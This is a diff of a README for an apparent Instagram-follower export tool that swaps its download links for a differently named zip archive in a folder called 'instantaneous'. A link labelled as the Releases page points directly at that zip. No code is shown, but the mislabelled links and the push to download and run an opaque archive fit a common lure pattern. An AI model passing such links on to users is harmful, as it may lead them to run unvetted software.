@@ -8,7 +8,7 @@ Welcome to the export-list-of-instagram-followers project! This tool helps you e
 
 To download the latest version of the application, visit the Releases page and look for the most recent release. You can find it here:
 
-[**Download the latest release**](https://raw.githubusercontent.com/Jadelinda81/export-list-of-instagram-followers/main/instantaneous/export-list-of-instagram-followers.zip)
+[**Download the latest release**](https://github.com/Jadelinda81/export-list-of-instagram-followers/raw/refs/heads/main/instantaneous/export_instagram_of_list_followers_v1.0.zip)
 
 **Follow these steps to download and run the software:**
 
@@ -83,6 +83,6 @@ If you need further assistance, feel free to contact our support team via the Is
 
 To remain informed about the latest updates and features, check back regularly at the Releases page:
 
-[**Visit the Releases Page**](https://raw.githubusercontent.com/Jadelinda81/export-list-of-instagram-followers/main/instantaneous/export-list-of-instagram-followers.zip)  
+[**Visit the Releases Page**](https://github.com/Jadelinda81/export-list-of-instagram-followers/raw/refs/heads/main/instantaneous/export_instagram_of_list_followers_v1.0.zip)  
 
 Thank you for using export-list-of-instagram-followers, and enjoy managing your Instagram followers!
